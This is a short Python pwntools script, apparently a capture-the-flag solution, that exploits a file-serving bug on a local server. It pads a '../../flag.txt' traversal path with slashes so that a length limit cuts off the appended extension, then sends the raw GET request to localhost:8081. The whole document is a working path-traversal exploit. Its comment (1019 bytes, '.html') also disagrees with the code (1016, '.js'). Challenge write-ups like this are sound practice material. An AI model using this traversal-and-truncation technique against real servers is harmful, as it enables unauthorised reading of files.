from pwn import *
import time

# add slashes to make the entire string 1019 bytes long
# in this way, we will push out .html at the very end while real_path is constructed in read_file
def pad(path):
    assert len(path) <= 1016
    prefix = '/' * (1016 - len(path))
    suffix = '.js'
    return prefix + path + suffix

if __name__ == '__main__':
    r = remote('localhost', 8081)

    path = pad('../../flag.txt')
    payload = f'GET /{path}'

    r.send(payload.encode())
    r.interactive()